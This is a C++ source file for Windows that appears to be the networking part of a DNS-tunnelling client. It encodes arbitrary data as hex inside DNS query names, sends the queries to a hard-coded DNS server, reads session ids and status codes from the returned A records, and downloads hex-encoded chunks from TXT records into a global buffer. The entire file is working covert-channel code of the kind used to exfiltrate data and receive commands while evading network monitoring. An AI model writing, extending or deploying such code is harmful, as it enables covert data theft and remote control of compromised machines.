#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "Network.h"
#include <iostream>
#include <string>
#include <sstream>
#include <iomanip>
#include <vector>
#include <winsock2.h>
#include <windns.h>

#pragma comment(lib, "Dnsapi.lib") 
#pragma comment(lib, "Ws2_32.lib")


int startConnection(const char* domain) {
	if (!domain) {
		return -1;
	}

	std::string fullString = "a.1.1.1.";
	fullString += domain;
	const char* pOwnerName = fullString.c_str();
	WORD wType = DNS_TYPE_A;
	PDNS_RECORD pDnsRecord = nullptr;
	

	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
	if (!pSrvList) {
		return -1;
	}

	pSrvList->AddrCount = 1;
	pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
	
	DNS_STATUS status;
	{
		std::lock_guard<std::mutex> lock(g_dnsSendMutex);
		status = DnsQuery_A(
			pOwnerName,
			wType,
			DNS_OPTIONS,
			pSrvList,
			&pDnsRecord,
			nullptr
		);
	}
	
	LocalFree(pSrvList);
	
	
	if (status) {
		return -1;
	}
	
	if (!pDnsRecord) {
		return -1;
	}
	
	IN_ADDR ipaddr;
	ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
	std::string ipStr = inet_ntoa(ipaddr);
	DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
	
	size_t lastDot = ipStr.rfind(".");
	if (lastDot == std::string::npos) {
		return -1;
	}
	
	int connectionId = std::stoi(ipStr.substr(lastDot + 1));
	return connectionId;
}


int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
	if (!domain || !data) {
		return -1;
	}

	std::ostringstream fullStream;
	fullStream << "b." << packetNumber << "." << id << "." << convertToHex(data) << "." << domain;
	std::string full = fullStream.str();
	const char* pOwnerName = full.c_str();
	
	WORD wType = DNS_TYPE_A;
	PDNS_RECORD pDnsRecord = nullptr;
	
	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
	if (!pSrvList) {
		return -1;
	}

	pSrvList->AddrCount = 1;
	pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
	
	DNS_STATUS status;
	int retCode = -1;
	
	for (int i = 0; i < 3; i++) {
		pDnsRecord = nullptr;
		
		status = DnsQuery_A(
			pOwnerName,
			wType,
			DNS_OPTIONS,
			pSrvList,
			&pDnsRecord,
			nullptr
		);
		
		
		if (!status && pDnsRecord) {
			IN_ADDR ipaddr;
			ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
			std::string ipStr = inet_ntoa(ipaddr);
			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
			
			size_t firstDot = ipStr.find(".");
			if (firstDot == std::string::npos) {
				goto cleanup;
			}
			
			int code = std::stoi(ipStr.substr(0, firstDot));
			
			switch (code) {
				case 200:  
					retCode = 0;
					goto cleanup;
					
				case 201:  
					break;
					
				case 202: 
					{
						int new_id = startConnection(domain);
						if (new_id != -1) {
							id = new_id;
						}
					}
					i--;  
					break;
					
				case 203:  
					packetNumber = 0;
					i--;  
					break;
					
				case 204: 
					goto cleanup;
					
				default:
					goto cleanup;
			}
		}
		
		Sleep(200); 
	}
	
cleanup:
	if (pSrvList) {
		LocalFree(pSrvList);
	}
	return retCode;
}

int sendDataTypeC(int& id, int& packetNumber, size_t& offset, const char* domain, const char* data) {
	if (!domain || !data) {
		return -1;
	}

	std::ostringstream fullStream;
	fullStream << "c." << packetNumber << "." << offset << "." << id << "." << data << "." << domain;
	std::string full = fullStream.str();
	const char* pOwnerName = full.c_str();
	
	// Debug output
	std::cout << "[sendDataTypeC] Query: " << full << std::endl;
	std::cout << "[sendDataTypeC] Query length: " << full.length() << " chars" << std::endl;
	
	WORD wType = DNS_TYPE_A;
	PDNS_RECORD pDnsRecord = nullptr;
	
	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
	if (!pSrvList) {
		return -1;
	}

	pSrvList->AddrCount = 1;
	pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
	
	DNS_STATUS status;
	int retCode = -1;
	
	for (int i = 0; i < 3; i++) {
		pDnsRecord = nullptr;
		
		{
			std::lock_guard<std::mutex> lock(g_dnsSendMutex);
			status = DnsQuery_A(
				pOwnerName,
				wType,
				DNS_OPTIONS,
				pSrvList,
				&pDnsRecord,
				nullptr
			);
		}
		
		
		if (!status && pDnsRecord) {
			IN_ADDR ipaddr;
			ipaddr.S_un.S_addr = pDnsRecord->Data.A.IpAddress;
			std::string ipStr = inet_ntoa(ipaddr);
			DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
			
			std::cout << "[sendDataTypeC] Received IP: " << ipStr << std::endl;
			
			size_t firstDot = ipStr.find(".");
			if (firstDot == std::string::npos) {
				std::cout << "[sendDataTypeC] ERROR: Invalid IP format" << std::endl;
				goto cleanup;
			}
			
			int code = std::stoi(ipStr.substr(0, firstDot));
			std::cout << "[sendDataTypeC] Response code: " << code << std::endl;
			
			switch (code) {
			case 200:  
				std::cout << "[sendDataTypeC] ✓ Success (200)" << std::endl;
				retCode = 0;
				goto cleanup;
					
			case 201:  
				break;
					
			case 202: 
				{
					int new_id = startConnection(domain);
					if (new_id != -1) {
						id = new_id;
					}
				}
				i--;  
				break;
					
			case 203:  
				packetNumber = 0;
				i--;  
				break;
					
			case 204: 
				goto cleanup;
					
			default:
				std::cout << "[sendDataTypeC] Unknown response code: " << code << std::endl;
				goto cleanup;
			}
		} else {
			std::cout << "[sendDataTypeC] Retry " << (i+1) << "/3 - DNS query failed, status: " << status << std::endl;
		}
		
		Sleep(200); 
	}
	
	std::cout << "[sendDataTypeC] All retries failed, returning -1" << std::endl;
	
	cleanup:
		if (pSrvList) {
			LocalFree(pSrvList);
		}
	return retCode;
}

int sendDataTypeP(int& id, int& packetNumber, size_t& offset, const char* domain)
{
	if (!domain) {
		return -1;
	}

	std::ostringstream fullStream;
	fullStream << "p." << packetNumber << "." << offset << "." << id << "." << domain;
	std::string full = fullStream.str();
	const char* pOwnerName = full.c_str();
	
	WORD wType = DNS_TYPE_TEXT; // 16
	PDNS_RECORD pDnsRecord = nullptr;
	
	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
	if (!pSrvList) {
		return -1;
	}

	pSrvList->AddrCount = 1;
	pSrvList->AddrArray[0] = inet_addr(DNS_SERVER_IP);
	
	DNS_STATUS status;
	int retCode = -1;
	
	for (int i = 0; i < 3; i++) {
		pDnsRecord = nullptr;
		
		{
			std::lock_guard<std::mutex> lock(g_dnsSendMutex);
			status = DnsQuery_A(
				pOwnerName,
				wType,
				DNS_OPTIONS,
				pSrvList,
				&pDnsRecord,
				nullptr
			);
		}
		
		
		if (status == ERROR_SUCCESS && pDnsRecord) {

            if (pDnsRecord->wType == DNS_TYPE_TEXT &&
                pDnsRecord->Data.TXT.dwStringCount > 0)
            {
                std::wstring txtWide = pDnsRecord->Data.TXT.pStringArray[0];

                // --- TXT rỗng => hết chunk ---
                if (txtWide.empty()) {
                    retCode = 0;
                    DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
                    goto cleanup;
                }

                // Convert wstring to narrow string (ASCII hex)
                std::string hexStr(txtWide.begin(), txtWide.end());
                
                // Decode hex to bytes
                std::string decodedChunk;
                for (size_t i = 0; i < hexStr.length(); i += 2) {
                    if (i + 1 < hexStr.length()) {
                        std::string byteStr = hexStr.substr(i, 2);
                        char byte = static_cast<char>(std::stoi(byteStr, nullptr, 16));
                        decodedChunk += byte;
                    }
                }
                
                // Convert decoded UTF-8 bytes to wstring for g_outChunk
                int wlen = MultiByteToWideChar(CP_UTF8, 0, decodedChunk.c_str(), -1, nullptr, 0);
                if (wlen > 0) {
                    std::wstring wbuf(wlen - 1, 0);
                    MultiByteToWideChar(CP_UTF8, 0, decodedChunk.c_str(), -1, &wbuf[0], wlen);
                    
                    std::lock_guard<std::mutex> lock(g_outChunkMutex);
                    g_outChunk = wbuf;
                }

                retCode = 1; // Có chunk
                DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
                goto cleanup;
            }

            DnsRecordListFree(pDnsRecord, DnsFreeRecordList);
        }
		
		Sleep(200); 
	}
	
	cleanup:
		if (pSrvList) {
			LocalFree(pSrvList);
		}
	return retCode;
}


std::string convertToHex(const char* string) {
	if (!string) {
		return "";
	}

	std::ostringstream out;
	out << std::hex << std::setfill('0');
	
	for (const char* i = string; *i; i++) {
		out << std::setw(2) << static_cast<unsigned>(static_cast<unsigned char>(*i));
	}
	
	return out.str();
}